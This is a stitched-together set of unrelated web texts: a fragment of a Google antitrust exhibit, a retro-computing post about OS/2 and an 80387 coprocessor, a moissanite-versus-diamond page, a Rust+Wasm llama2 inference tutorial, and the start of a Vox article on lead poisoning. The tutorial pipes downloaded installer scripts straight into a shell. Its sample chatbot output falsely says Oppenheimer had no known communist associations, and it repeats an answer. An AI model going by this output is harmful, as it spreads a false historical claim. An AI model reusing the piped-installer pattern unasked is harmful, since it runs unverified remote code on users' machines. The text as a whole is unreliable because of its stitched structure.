wonderful channel for us. But now Google is effectively trying to take our business, and I sincerely believe delivering a worse consumer experience, and attempting to eviscerate the competitive landscape. I don't think it's good for Google, I don't think it's good for the consumer, I don't think it's good for the country, and it's most certainly not good for us. So, I wish they'd stop allocating the best Google real estate in search to their own inferior products, and making it impossible for us play anywhere near the top of the page to show our products to consumers. But I suppose they will continue to do what they feel they need to do to their paying advertisers, and we will do whatever we need to do to try to protect our business and consumers. If Google is truly focused on growing our partnership as stated below, it's not at all clear to us how right now.</span></p><p><strong>[This document is from U.S. v.

<p>It’s a great game, that runs on many 8-bit/16-bit systems of the era, and is surprisingly a very well behaved MS-DOS game. I mean if Windows/386 VGA machines can run it in a window using the CGA version, surely a super early OS/2 2.0 beta (6.123) can run it, right? However I found 6.123 to be incredibly unstable, and sadly not up to the task.</p>
<p>I tried to launch BattleTech over and over and had zero success. I couldn’t figure out why it was struggling on my model 80 board, where it runs just great on 86Box. What is going on?</p>
<p>One thing I had stumbled upon was that if I launched an ancient Infocom game in a DOS box, and then launched BattleTech it had a much higher chance of running. But this did not always equate to it working. How is launching an old COM file from the early 80’s excise the ‘devil’ of some 1988 EXE from running?</p>

<p>I wasn’t sure but I had this weird suspicion that it was that my system was lacking a math coprocessor. When I had the model 60 286 board in the PS/2 case I did spring for an 80287, and one thing I found is that OS/2 1.0 &amp; 1.21 ran <em>great</em>. As a matter of fact I think it ran better than when I used to have a 386sx-16 and then later a 486SX-20. Now it’s been closer to 30 years, so I could have an absolutely false memory of all this, but I wasn’t sure I was onto something. So while shopping around a subscriber offered me a math coprocessor as they seem to be insanely expensive in the UK. I have no idea why the 80287 was so cheap, and no idea how to make any kind of adapter, but pJok was able to score one for super cheap in his homeland and send it to the barren wastelands of Scotland. As I was wrapping up the SSD G5 fun, the coprocessor arrived, and it was time to install it!</p>

It’s what we might call foreshadowing</figcaption></figure>
<p>The PS/2 8580 motherboard is really oddly designed with chip orientation going in every which other direction, and the 80387 socket isn’t keyed by pin, so it’s vital to see the notches on the silkscreen. Otherwise I just used compressed air to blow out the socket, and run the reference disk to add the processor.</p>

<p>The processor was instantly picked up, although I had the crashing issue with the BocaRAM/2 memory card again, which meant I had to remove the RAM card, re-configure with the math coprocessor, then add the RAM card, reconfigure, then run the util to patch the CMOS so it’d boot up. I really dislike this RAM card, but 32bit cards cost far more than this entire endeavor cost so I’m pretty much stuck with it.</p>
<p>Now let’s compare the Landmark scores between the 286/287 and the 386/ITT387</p>

<p>And now the 386:</p>
<figure><a href="https://virtuallyfun.com/wp-content/uploads/2023/11/model-80-bench-scaled.jpg"><img loading="lazy" decoding="async" width="1024" height="768" src="https://virtuallyfun.com/wp-content/uploads/2023/11/model-80-bench-1024x768.jpg" alt="" srcset="http://virtuallyfun.com/wp-content/uploads/2023/11/model-80-bench-1024x768.jpg 1024w, http://virtuallyfun.com/wp-content/uploads/2023/11/model-80-bench-300x225.jpg 300w, http://virtuallyfun.com/wp-content/uploads/2023/11/model-80-bench-768x576.jpg 768w, http://virtuallyfun.com/wp-content/uploads/2023/11/model-80-bench-1536x1152.jpg 1536w, http://virtuallyfun.com/wp-content/uploads/2023/11/model-80-bench-2048x1536.jpg 2048w, http://virtuallyfun.com/wp-content/uploads/2023/11/model-80-bench-400x300.jpg 400w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Landmark System Speed Test with the PS/2 model 80 80386/ITT 80387</figcaption></figure>
<p>The ITT processor is significantly faster than the old 80287, which is pretty amazing. The system bus is running at 16Mhz, although being 32bit vs 16bit yielding a nearly 2x in performance, although the ITT co-processor is so much more efficient.</p>
<figure><video controls="" src="https://virtuallyfun.com/wp-content/uploads/2023/11/72117154310__D50E8812-005D-46F7-B3A5-ECFCC2004151-1.mov"></video></figure>
<p>Booting back into OS/2 6.123, and yeah now it just works! No fussing around, everything is just great.</p>
<p>I’m kind of lost too, as none of this should require the maths coprocessor, but the results speak for themselves. I used to wonder once I got some disk images for this ancient version of OS/2, why didn’t they ship it? Sure that insane fight with Microsoft on refusing something like Windows on OS/2, or even WLO like Windows IN OS/2 from being part of the product killed any hope of running apps, but this version of OS/2 is already caught in the trap that it can run MS-DOS so well, despite DPMI not being a thing right now.</p>
<p>As I’d mentioned it does run just fine in 86Box, so what is the deal? Well that lead me to look back at when it did crash I noticed an odd string 038600b1</p>

TRAP 000e</figcaption></figure>
<p>So what does this mean? Well looking back at the CPU let’s try to decode some of it</p>
<figure><a href="https://www.cpu-world.com/sspec/S4/S40344.html"><img loading="lazy" decoding="async" width="1024" height="999" src="https://virtuallyfun.com/wp-content/uploads/2023/11/IMG_9191-1024x999.jpg" alt="" srcset="http://virtuallyfun.com/wp-content/uploads/2023/11/IMG_9191-1024x999.jpg 1024w, http://virtuallyfun.com/wp-content/uploads/2023/11/IMG_9191-300x293.jpg 300w, http://virtuallyfun.com/wp-content/uploads/2023/11/IMG_9191-768x749.jpg 768w, http://virtuallyfun.com/wp-content/uploads/2023/11/IMG_9191-307x300.jpg 307w, http://virtuallyfun.com/wp-content/uploads/2023/11/IMG_9191.jpg 1116w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>16Mhz 80386</figcaption></figure>
<p>First, it’s an A80386-16, which really isn’t that hard to figure out it’s a 16Mhz rated 80386. Next is the revision level, <a href="https://www.cpu-world.com/sspec/S4/S40344.html" target="_blank" rel="noreferrer noopener">S40344</a>. Searching around we can <a href="https://www.cpu-world.com/sspec/S4/S40337.html">find this table</a>:</p>
<pre><code>S40276 - A1 (but probably 12 MHz as S40277 is 12 MHz)
S40334 - A2
S40336 - B0
S40337 is B0 stepping
S40343 - B1
S40344 is B1 stepping
S40362 - B1 (20 MHz)</code></pre>
<p>So this places it at at the tail end of the introductory line of 386 processors. Checking over at <a href="https://www.pcjs.org/documents/manuals/intel/80386/">pcjs</a>, we find that there were quite a few more revisions to the 386.</p>
<ul>
<li><a href="https://www.pcjs.org/documents/manuals/intel/80386/#a0-stepping">A0 Stepping</a></li>
<li><a href="https://www.pcjs.org/documents/manuals/intel/80386/#a1-stepping">A1 Stepping</a></li>
<li><a href="https://www.pcjs.org/documents/manuals/intel/80386/#a2-stepping">A2 Stepping</a></li>
<li><a href="https://www.pcjs.org/documents/manuals/intel/80386/#b0-stepping">B0 Stepping</a></li>
<li><a href="https://www.pcjs.org/documents/manuals/intel/80386/#b1-stepping">B1 Stepping</a></li>
<li><a href="https://www.pcjs.org/documents/manuals/intel/80386/#c0-stepping">C0 Stepping</a></li>
<li><a href="https://www.pcjs.org/documents/manuals/intel/80386/#d0-stepping">D0 Stepping</a></li>
<li><a href="https://www.pcjs.org/documents/manuals/intel/80386/#d1-stepping">D1 Stepping</a></li>
<li><a href="https://www.pcjs.org/documents/manuals/intel/80386/#d2-stepping">D2 Stepping</a></li>
</ul>
<p>And further that the B1 Errata is actually quite substantial. Maybe this is why the 386 had such a poor reputation for Unix ports in the day, and why it was shunned by CSRG?</p>
<p>As mentioned in the infamous 32bit multiply bug, this processor had been tested and was given the ΣΣ mark of approval. There are numerous issues listed with the presence of a math coprocessor, I have to wonder if beyond issues for using the full 32bit datapath, if there were some electrical issues with utilizing the full datapath as well? Much like an improperly terminated SCSI bus, did the simple presence of the ITT 387 help with signaling and improve system stability? Or am I hitting some weird bug in 32bit math that is simulated due to the lack of a coprocessor, that once one is in the system, the operation is performed on hardware, sidestepping the entire issue? I’m neither an EE or any good at reversing code, so I really don’t know.</p>
<p>The date code 751 does mean that this processor was manufactured in the 51st week of 1987.</p>
<p>Looking at how ancient this CPU is, I have opted to order one that was made in 1990, an <a href="https://www.cpu-world.com/sspec/SX/SX218.html" target="_blank" rel="noreferrer noopener">SX218 or D1 stepping</a>.</p>
<p>Although it hasn’t arrived yet, I have to wonder if it would make a really big difference in 32bit system stability? I have to wonder if there was such a massive delay in OS/2 2.0 because of the early 386 processors having so many defects that it just added an undue burden to the development, along with the fighting between IBM &amp; Microsoft. While it would be interesting to see the difference between any of the Microsoft versions of OS/2 2.0, none have surfaced as of yet. Which is a shame.</p>
<p>Although it is nice to have this ‘mid’ IBM beta of OS/2, it does suffer from the ever so common issue of not being able to run any shipping 32bit executable, so unless you have source/object files to link, you are pretty much out of luck. The Microsoft Beta 2 tools are 16bit, so thankfully they run on pretty much any version of OS/2, and they ought to be able to run under Phar Lap 286 as well.</p>
<figure><a href="https://virtuallyfun.com/wp-content/uploads/2023/11/msos2-tee2.jpg"><img loading="lazy" decoding="async" width="733" height="831" src="https://virtuallyfun.com/wp-content/uploads/2023/11/msos2-tee.jpg" alt="" srcset="http://virtuallyfun.com/wp-content/uploads/2023/11/msos2-tee.jpg 733w, http://virtuallyfun.com/wp-content/uploads/2023/11/msos2-tee-265x300.jpg 265w" sizes="(max-width: 733px) 100vw, 733px"></a><figcaption>Microsoft OS/2 2.0 tee shirt</figcaption></figure>
<p>One thing that did recently surface on eBay, is a Microsoft tee shirt from their OS/2 2.0 group. With a minor bit of sleuthing, <a href="http://cd.textfiles.com/tothemaxss/GIF/SCIFI/ST_V_04.GIF">the Enterprise is from the 1989 ‘hit’ Star Trek V</a>. Maybe I’m too much of a nerd to have recognized the GIF.</p>
<p>Back some 20+ years ago when I lived in Miami, <a href="https://nextstep33.info/images/tn_100_1323.jpg" target="_blank" rel="noreferrer noopener">I did have a loaded out PS/2 model 80</a> back then, and I ran AIX on it, as I thought it was really cool. But it was also incredibly unstable. I have to wonder now if it was a fault of the processor, or the system? Then again back then I had 6 registered IP’s and of course my PS/2 was on the internet! Although it was also the right height to double as a standing mouse pad.</p>
<p>So I guess this potentially leaves us with some painful lesson that you ought to get the math coprocessor for older systems if you plan on running anything other than DOS/Windows with a DOS extender. While I do have a PS/2 version of Xenix, I haven’t been able to dump them yet as my Power Mac doesn’t like NON FAT disks. One thing is for sure, it made a massive difference in OS/2. I don’t think 16Mhz/6MB of RAM is anywhere near enough to run OS/2 2.00 at any decent speed so I’ll stick with the much lighter 6.123.</p>

	<h2>Why You Should NEVER Buy a Diamond, and What You Should Buy Instead...</h2>

	<p>I recently got engaged, and found myself in the market for a suitable engagement ring. Over the past few months, I've done quite a bit of research on diamonds and the diamond industry. What I learned, quite frankly, pissed me off.</p>
	<p>This site is about two very simple truths: (1) diamonds are an incredible rip-off, and (2) a little known naturally-occuring gemstone called <em>moissanite</em> is superior to diamonds in every essential way: cut, color, clarity, durability, fire, brilliance, and cost.</p>
	<p>I (obviously) don't work in the diamond industry. I don't work for anyone who sells moissanite. The intent of this website is to raise awareness among big-ticket jewelry purchasers (primarily couples buying engagement rings) about moissanite and its many benefits vs. diamond.</p>
	<p>If I can prevent a single reader from needlessly dropping $6,000-10,000+ on a diamond engagement ring, this site will be a success.  Financial worries are the #1 cause of stress in a married relationship - there is absolutely NO excuse to start your married life by taking on that level of debt.</p>
	<p>If you're in the market for diamond jewelry, or think you may be soon, please take a few minutes to read through this site.  I hope you learn something useful.</p>

	<h3>What is Moissanite?</h3>
	<p><a href="http://en.wikipedia.org/wiki/Moissanite" title="Moissanite" target="_blank">Moissanite</a> is a rare, naturally-occuring gemstone that is typically found in very small quantities in meteorites, corundum deposits, and kimberlite.  (The chemical name of moissanite is <a href="http://en.wikipedia.org/wiki/Silicon_carbide" target="_blank">Silicon Carbide</a>.)  Moissanite has several qualitites in common with diamond: it is transparent, extremely hard (9.25 on the <a href="http://en.wikipedia.org/wiki/Mohs_scale" target="_blank">Mohs scale</a>, compared to 10 for diamond), and has a high index of refraction (2.65 - 2.69, compared to 2.42 for diamond).  When a large rough moissanite sample is cut and polished, the end result is a very bright, brilliant, transparent gemstone that is indistinguishable from diamond to the human eye.</p>

	<p>Moissanite is also brighter, more lusterous, and has more fire than diamond. These criteria define how "pretty" the jewel is - the shine, the sparkle, and the prismatic qualities.  Check out this table on how moissanite compares to diamonds and other gemstones:</p>

	<h3>7 Reasons Why You Should NEVER Buy a Diamond:</h3>

	<p>1. The price of diamonds has been artificially inflated since the 1880's via the De Beers diamond cartel. For a detailed exposé of the De Beers cartel, <a href="http://www.theatlantic.com/doc/print/198202/diamond" target="_blank">read this article by Edward Jay Epstein in the February 1982 issue of <em>The Atlantic Monthly</em></a>.</p>
	<p>2. Current public perception of diamonds is the direct result of a masterfully executed marketing campaign by De Beers that began in 1938, not inherent scarcity or value. If you've <a href="http://www.theatlantic.com/doc/print/198202/diamond" target="_blank">read the article by Edward Epstein (you really should)</a>, you know all of the gory details.  Isn't it amazing (and scary) how brainwashed people are about the "value" of diamonds, even though they're not actually worth that much?</p>
	<p>3. A diamond is an illiquid asset, not an "investment". Don't believe me? Try to sell a second-hand diamond ring on eBay or at a pawn shop.  Do you really think you'll get anything close to what you paid for it?  Do you really think the price of any diamond you purchase today is going to go up significantly over time? A diamond ring isn't even a good "insurance policy" to fall back on during hard times - it's an illiquid asset that you'll have a hard time selling for a price anywhere close to what you paid for it.</p>
	<p>4. The diamond industry funds warfare, genocide, and terrorism. According to <a href="http://en.wikipedia.org/wiki/Conflict_diamond" target="_blank">Wikipedia</a>, <em>"a conflict diamond (also called a blood diamond or a war diamond) is a diamond mined in a war zone and sold, usually clandestinely, in order to finance an insurgent or invading army's war efforts."</em>  Profits from conflict diamonds are used to finance warlords in Angola, Sierra Leone, and Liberia, who use their weapons to kill and maim innocent people.  Isn't that romantic?</p>
	<p>5. A diamond is - by nature - just a pretty rock. Think of the oft-quoted "rule" of diamond ring buying: the ring should cost a minimum of two month's salary (pre-tax), and you should spend as much on a ring as you can afford. Let's put this rule in its proper context: <em>according to the people who sell pretty rocks, you're supposed to trade a full two months of your time and effort for one of their pretty rocks.</em> Does that seem wise?</p>
	<p>6. People notice the setting more than the diamond itself. To the naked human eye, most decent quality diamonds look the same. Unless the stone is yellow, has major inclusions, or has a distinctly lopsided cut, no one will be able to distinguish an ideal cut, E color, VS-1 stone from a lesser-quality diamond just by looking at it.  <u>What people do notice is the setting</u> - how the stone is featured or placed, side stones, and the craftsmanship and artistry of the band. Knowing this - does it make more sense to focus your attention and dollars on a better stone, or on a better setting?</p>
	<p>7. The opportunity cost of buying a diamond is huge. Opportunity cost is what you give up by spending your scarce resources on a single option.  In other words, if you drop ten grand on a diamond ring, you have $10,000 less to spend on other things, like a fantastic honeymoon, a car, furniture, a down payment on a house, investing for the future, or further education.  Are all of these options worth giving up for a little piece of colorless carbon?</p>

	<h3>8 Reasons Why Moissanite is a Better Choice than Diamond for Fine Jewelry, Particularly Engagement Rings:</h3>
	<p>1. Engagement/wedding rings have sentimental value, not asset/investment value. Wedding rings do only two things: (1) look pretty and (2) provide a symbol / memento of the event. Accordingly, you're best served by purchasing a high quality ring that meets these two criteria at the lowest possible cost. The cost/quality/durability attributes of moissanite make it much more attractive than diamond for use in wedding rings.</p>
	<p>2. All moissanite gems are near flawless. Since moissanite can be reliably made in a laboratory, it's easy to do quality control.  Instead of selling anything that comes out of the ground, flawed moissanite can be identified and discarded. This means the moissanite you buy will be a much better quality stone than a more expensive diamond.</p>
	<p>3. Spending less on the stone means you can spend more on the setting. Since people notice the setting more than the stone itself, the lower cost of moissanite means you have <u>far</u> more options to make your ring unique while keeping within your budget.  Side stones, crafted bands, and bezel-set accents are all suddenly within your budget.</p>
	<p>4. You won't start your married life in crushing debt. It's often said that financial issues are the biggest cause of arguments and difficulties in a marriage, sometimes leading all the way to divorce.  Doesn't it make sense to ensure you and your wife-to-be are in the black as soon as humanly possible?  Saving for a down payment, creating an emergency fund, and putting aside money to invest are all substantially easier when you're not paying hundreds of dollars a month to the lending institution that financed the diamond purchase.</p>
	<p>5. Speaking of financing: you'll probably be able to pay cash for moissanite. If you plan ahead, you'll be able to purchase the ring with cash, avoiding interest charges that make a diamond ring even more expensive. (<a href="http://www.bluenile.com/services_channel.asp?track=59" target="_blank">9.99% - 27.99% APR, anyone?</a>)</p>
	<p>6. Other people will assume the ring is made of diamond, since they won't be able to tell the difference. I'm not one to pass something off as another, but the reality is that people are so brainwashed about diamonds that everyone who sees your fiancée's ring will assume it is made out of diamond.  (Most of the time, it's not worth explaining to them it's not.)  In the 6 months my fiancée has had her ring, 100% of the people who have seen it think it's diamond.  If you're worried about a "loss in prestige" if someone notices, rest assured that other people will never know unless you tell them.  (Note: <u>do not try to buy your fiancée a moissanite ring and pass it off as a diamond</u>. Honesty is key - talk to her about it first.)</p>
	<p>7. You can rest assured that your hard-earned money isn't subsidizing African warlords. Sleep easy - no innocent people were killed in the creation of your fine jewelry.</p>
	<p>8. You get more bling for your buck. Given a fixed budget, you have far more creative options with moissanite than you do with diamond. Want a 2 carat solitaire?  Go for it!  Custom design also becomes a very affordable option. Design a ring that fits your fiancée perfectly! Your bride-to-be will love the fact that you put your creativity into the purchase, and she'll love telling her friends what good taste you have.</p>

	<h3>Go See Moissanite for Yourself</h3>
	<p>I've put a lot of hours into making sure moissanite is all it's cracked up to be, and have put my own hard-earned dollars on the line in purchasing a moissanite engagement ring.  The research I did took days, but I consider it time well-spent: I bought a custom-designed, extremely well-made engagement ring my fiancée loves for thousands of dollars less than what I would have paid for a diamond. If you're in the market for jewelry, you owe it to yourself to go see moissanite in person before buying a diamond.</p>

	<p>Good luck, and may you and your loved one have a long, happy life together!</p>

<div id="readability-page-1" class="page"><article><p><em>The Rust+Wasm stack provides a strong alternative to Python in AI inference.</em></p>
<p>Compared with Python, Rust+Wasm apps could be 1/100 of the size, 100x the speed, and most importantly securely run everywhere at full hardware acceleration without any change to the binary code. <a href="https://blog.stackademic.com/why-did-elon-musk-say-that-rust-is-the-language-of-agi-eb36303ce341" target="_blank">Rust is the language of AGI</a>.</p>
<p>We created a very simple <a href="https://github.com/second-state/WasmEdge-WASINN-examples/tree/master/wasmedge-ggml-llama-interactive" target="_blank">Rust program</a> to run inference on llama2 models at native speed. When compiled to Wasm, the <a href="https://github.com/second-state/WasmEdge-WASINN-examples/blob/master/wasmedge-ggml-llama-interactive/wasmedge-ggml-llama-interactive.wasm" target="_blank">binary application</a> (only 2MB) is completely portable across devices with heterogeneous hardware accelerators. The Wasm runtime (<a href="https://github.com/WasmEdge/WasmEdge" target="_blank">WasmEdge</a>) also provides a safe and secure execution environment for cloud environments. In fact, the <a href="https://wasmedge.org/docs/start/build-and-run/docker_wasm" target="_blank">WasmEdge runtime works seamlessly with container tools</a> to orchestrate and execute the portable application across many different devices.</p>

Chatting with llama2 models on my MacBook
<p>This work is based on the <a href="https://github.com/ggerganov/llama.cpp" target="_blank">llama.cpp project</a> created by <a href="https://github.com/ggerganov" target="_blank">Georgi Gerganov</a>. We adopted the original C++ program to run on Wasm. It works with the <a href="https://github.com/philpax/ggml/blob/gguf-spec/docs/gguf.md" target="_blank">GGUF formatted</a> model files.</p>
<p><strong>Step 1. Install WasmEdge with the GGML plugin</strong></p>
<p>Use the following command on Linux or Mac devices to install everything. <a href="https://github.com/second-state/WasmEdge-WASINN-examples/blob/master/wasmedge-ggml-llama-interactive/README.md#requirement" target="_blank">See here for more details.</a></p>
<pre><code>curl -sSf https://raw.githubusercontent.com/WasmEdge/WasmEdge/master/utils/install.sh | bash -s -- --plugin wasi_nn-ggml
</code></pre><p><strong>Step 2. Download a pre-built Wasm app and the model</strong></p>
<pre><code>curl -LO https://github.com/second-state/llama-utils/raw/main/chat/llama-chat.wasm
</code></pre><p>You should also download a llama2 model in GGUF format. The example below downloads the llama2 7B chat-tuned model quantized to 5-bit weights (<a href="https://www.secondstate.io/articles/convert-pytorch-to-gguf/" target="_blank">see more here</a>).</p>
<pre><code>curl -LO https://huggingface.co/wasmedge/llama2/resolve/main/llama-2-7b-chat-q5_k_m.gguf
</code></pre><p><strong>Step 3. Run it!</strong></p>
<p>Use WasmEdge to run the wasm inference application, and pass the GGUF model to it. You can now enter a question to chat with the model.</p>

[USER]:
Who is the "father of the atomic bomb"?
[ASSISTANT]:
The "father of the atomic bomb" is a term commonly associated with physicist J. Robert Oppenheimer. Oppenheimer was a leading figure in the development of the atomic bomb during World War II, serving as the director of the Manhattan Project, which was responsible for the development and deployment of the first nuclear weapons. He is often referred to as the "father of the atomic bomb" due to his significant contributions to the field of nuclear physics and his leadership in the development of the bomb.
[USER]:
Was he a communist?
[ASSISTANT]:
J. Robert Oppenheimer was not a communist. While he was associated with the Manhattan Project, which was a secret government project, and was involved in the development of the atomic bomb, he was not a member of the Communist Party or had any known political affiliations with communism. Oppenheimer was a physicist and a scientist, and his primary focus was on the development of nuclear weapons during World War II.

[ASSISTANT]:
The "father of the atomic bomb" is a term commonly associated with physicist J. Robert Oppenheimer. Oppenheimer was the director of the Manhattan Project, the secret research and development project that produced the first atomic bomb during World War II. He is widely recognized as the leading figure in the development of the atomic bomb and is often referred to as the "father of the atomic bomb."

<p>We have also created an OpenAI-compatible API server using Rust and WasmEdge. It allows you use any OpenAI-compatible developer tools, such as <a href="https://flows.network/" target="_blank">flows.network</a>, to create LLM agents and apps. <a href="https://www.secondstate.io/articles/wasm-runtime-agi/#build-a-super-lightweight-ai-agent" target="_blank">Learn more here.</a></p>

Llama on the edge. Image generated by Midjourney.</p>
<h2 id="why-not-python"><strong>Why not Python?</strong></h2>
<p>LLMs like llama2 are typically trained in Python (e.g. PyTorch, Tensorflow, and JAX). But to use Python for inference applications, which is about 95% of the computing in AI, would be a bad mistake.</p>
<ul>
<li><a href="https://x.com/santiviquez/status/1676677829751177219" target="_blank">Python packages have complex dependencies</a>. They are difficult to set up and use.</li>
<li>Python dependencies are huge. A Docker image for Python or PyTorch is typically <a href="https://hub.docker.com/r/pytorch/pytorch/tags" target="_blank">several GBs</a> or even <a href="https://github.com/pytorch/serve/issues/1420" target="_blank">tens of GBs</a>. That is especially problematic for AI inference on edge servers or on devices.</li>
<li>Python is a very slow language. <a href="https://www.modular.com/blog/how-mojo-gets-a-35-000x-speedup-over-python-part-1" target="_blank">Up to 35,000x slower</a> than compiled languages such as C, C++, and Rust.</li>
<li>Because Python is slow, most of the actual workloads must be <a href="https://x.com/gdb/status/1676726449934331904" target="_blank">delegated to native shared libraries</a> beneath the Python wrapper. That makes Python inference apps <a href="https://podcasts.apple.com/ph/podcast/expanding-ai-chip-capabilities-beyond-nvidia-with/id315114957?i=1000627798935" target="_blank">great for demos, but very hard to modify</a> under the hood for business-specific needs.</li>
<li>The heavy dependency on native libraries, combined with complex dependency management, makes it very hard to port Python AI programs across devices while taking advantage of the device’s unique hardware features.</li>
</ul>

<p>Commonly used Python packages in LLM toolchain are directly conflicting with each other.</p>
<p><a href="https://en.wikipedia.org/wiki/Chris_Lattner" target="_blank">Chris Lattner</a>, of the LLVM, Tensorflow, and Swift language fame, gave <a href="https://www.youtube.com/watch?v=ap0VLOPyGqM" target="_blank">a great interview</a> on the This Week in Startup podcast. He discussed why Python is great for model training but the wrong choice for inference applications.</p>
<h2 id="the-advantages-of-rustwasm"><strong>The advantages of Rust+Wasm</strong></h2>
<p>The Rust+Wasm stack provides a unified cloud computing infra that spans devices to edge cloud, on-prem servers, and the public cloud. It is a strong alternative to the Python stack for AI inference applications. No wonder Elon Musk said that Rust is the language of AGI.</p>
<ul>
<li><strong>Ultra lightweight.</strong> The inference application is just 2MB with all dependencies. It is less than 1% of the size of a typical PyTorch container.</li>
<li><strong>Very fast.</strong> Native C/Rust speed in all parts of the inference application: pre-processing, tensor computation, and post-processing.</li>
<li><strong>Portable.</strong> The same Wasm bytecode application can run on all major computing platforms with support for heterogeneous hardware acceleration.</li>
<li><strong>Easy to set up, develop and deploy.</strong> There are no more complex dependencies. Build a single Wasm file using standard tools on your laptop and deploy it everywhere!</li>
<li><strong>Safe and cloud-ready.</strong> The Wasm runtime is designed to isolate untrusted user code. The Wasm runtime can be managed by container tools and easily deployed on cloud-native platforms.</li>
</ul>
<h2 id="the-rust-inference-program"><strong>The Rust inference program</strong></h2>
<p>Our demo inference program is written in Rust and compiled into Wasm. The core <a href="https://github.com/second-state/llama-utils/blob/main/simple/src/main.rs" target="_blank">Rust source code</a> is very simple. It is only 40 lines of code. The Rust program manages the user input, tracks the conversation history, transforms the text into the llama2’s chat template, and runs the inference operations using the <a href="https://github.com/WebAssembly/wasi-nn" target="_blank">WASI NN API</a>.</p>
<pre><code>fn main() {
   let args: Vec&lt;String&gt; = env::args().collect();
   let model_name: &amp;str = &amp;args[1];

   let graph =
       wasi_nn::GraphBuilder::new(wasi_nn::GraphEncoding::Ggml, wasi_nn::ExecutionTarget::AUTO)
           .build_from_cache(model_name)
           .unwrap();
   let mut context = graph.init_execution_context().unwrap();

   let system_prompt = String::from("&lt;&lt;SYS&gt;&gt;You are a helpful, respectful and honest assistant. Always answer as short as possible, while being safe. &lt;&lt;/SYS&gt;&gt;");
   let mut saved_prompt = String::new();

   loop {
       println!("Question:");
       let input = read_input();
       if saved_prompt == "" {
           saved_prompt = format!("[INST] {} {} [/INST]", system_prompt, input.trim());
       } else {
           saved_prompt = format!("{} [INST] {} [/INST]", saved_prompt, input.trim());
       }

       // Set prompt to the input tensor.
       let tensor_data = saved_prompt.as_bytes().to_vec();
       context
           .set_input(0, wasi_nn::TensorType::U8, &amp;[1], &amp;tensor_data)
           .unwrap();

       // Execute the inference.
       context.compute().unwrap();

       // Retrieve the output.
       let mut output_buffer = vec![0u8; 1000];
       let output_size = context.get_output(0, &amp;mut output_buffer).unwrap();
       let output = String::from_utf8_lossy(&amp;output_buffer[..output_size]).to_string();
       println!("Answer:\n{}", output.trim());

       saved_prompt = format!("{} {} ", saved_prompt, output.trim());
   }
}
</code></pre><p>To build the application yourself, just install the Rust compiler and its <code>wasm32-wasi</code> compiler target.</p>
<pre><code>curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
rustup target add wasm32-wasi
</code></pre><p>Then, check out the source project, and run the <code>cargo</code> command to build the Wasm file from the Rust source project.</p>
<pre><code># Clone the source project
git clone https://github.com/second-state/llama-utils
cd llama-utils/chat/

# Build
cargo build --target wasm32-wasi --release

# The result wasm file
cp target/wasm32-wasi/release/llama-chat.wasm .
</code></pre><h2 id="running-in-the-cloud-or-on-the-edge"><strong>Running in the cloud or on the edge</strong></h2>
<p>Once you have the Wasm bytecode file, you can deploy it on any device that supports the WasmEdge runtime. You just need to <a href="https://github.com/second-state/WasmEdge-WASINN-examples/tree/master/wasmedge-ggml-llama-interactive#requirement" target="_blank">install the WasmEdge with the GGML plugin</a>. We currently have GGML plugins for generic Linux and Ubuntu Linux — both on x86 and ARM CPUs and Nvidia GPUs, as well as Apple M1/M2/M3.</p>
<p>Based on <a href="https://github.com/ggerganov/llama.cpp" target="_blank">llama.cpp</a>, the WasmEdge GGML plugin will automatically take advantage of any hardware acceleration on the device to run your llama2 models. For example, if your device has Nvidia GPU, the installer will automatically install a CUDA-optimized version of the GGML plugin. For Mac devices, the Mac OS build of the GGML plugin uses the Metal API to run the inference workload on M1/M2/M3’s built-in neural processing engines. The Linux CPU build of the GGML plugin uses the OpenBLAS library to auto-detect and utilize the advanced computational features, such as AVX and SIMD, on modern CPUs.</p>
<p>That’s how we achieve portability across heterogeneous AI hardware and platforms without sacrificing performance.</p>
<h2 id="whats-next"><strong>What’s next</strong></h2>
<p>While the WasmEdge GGML tooling is usable (and indeed used by our cloud-native customers) today, it is still in its early stages. If you are interested in contributing to the open source projects and shaping the direction of future LLM inference infrastructure, here are some low-hanging fruits that you can <a href="https://wasmedge.org/docs/contribute/overview" target="_blank">potentially contribute to</a>!</p>
<ul>
<li>Add GGML plugins for more hardware and OS platforms. We are also interested in TPUs, ARM NPUs, and other specialized AI chips on Linux and Windows.</li>
<li>Support more <a href="https://github.com/ggerganov/llama.cpp" target="_blank">llama.cpp</a> configurations. We currently support passing some config options from Wasm to the GGML plugin. But we would like to support all the options GGML provides!</li>
<li>Support WASI NN APIs in other Wasm-compatible languages. We are specifically interested in Go, Zig, Kotlin, JavaScript, C and C++.</li>
</ul>
<h2 id="other-ai-models"><strong>Other AI models</strong></h2>
<p>As a lightweight, fast, portable, and secure Python alternative, WasmEdge and WASI NN are capable of building inference applications around popular AI models beyond LLMs. For example,</p>
<ul>
<li>The <a href="https://github.com/WasmEdge/mediapipe-rs" target="_blank">mediapipe-rs</a> project provides Rust+Wasm APIs for Google’s <a href="https://developers.google.com/mediapipe" target="_blank">mediapipe</a> suite of Tensorflow models.</li>
<li>The <a href="https://github.com/WasmEdge/WasmEdge/issues/2768" target="_blank">WasmEdge YOLO</a> project provides Rust+Wasm APIs to work with <a href="https://ultralytics.com/yolov8" target="_blank">YOLOv8</a> PyTorch models.</li>
<li>The <a href="https://github.com/second-state/WasmEdge-WASINN-examples/tree/master/openvino-road-segmentation-adas" target="_blank">WasmEdge ADAS demo</a> shows how to perform road segmentation in self-driving cars using an Intel OpenVINO model.</li>
<li>The <a href="https://github.com/WasmEdge/WasmEdge/issues/2356" target="_blank">WasmEdge Document AI</a> project will provide Rust+Wasm APIs for a suite of popular OCR and document processing models.</li>

            <description><![CDATA[<p>URL: <a href="https://www.vox.com/future-perfect/2023/9/20/23881981/bangladesh-tumeric-lead-poisoning-contamination-public-health">https://www.vox.com/future-perfect/2023/9/20/23881981/bangladesh-tumeric-lead-poisoning-contamination-public-health</a>, See on <a href="https://news.ycombinator.com/item?id=38246209">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  <p id="koTNFG">My colleague Dylan Matthews recently wrote about the <a href="https://www.vox.com/future-perfect/2023/9/14/23868347/lead-poisoning-death-toll-world-bank-pure-earth">horrific global toll of lead poisoning</a>, which contributes to as many as 5.5 million premature deaths a year — more than HIV, malaria, and car accidents combined.</p>
<p id="S01PfZ">Lead is a neurotoxin; it causes premature deaths and lifelong negative effects. It’s said “<a href="https://stanmed.stanford.edu/turmeric-lead-risk-detect/">there is no safe level of lead exposure</a>” — as far as we know, any lead causes damage, and it just gets worse the more exposure there is. </p>
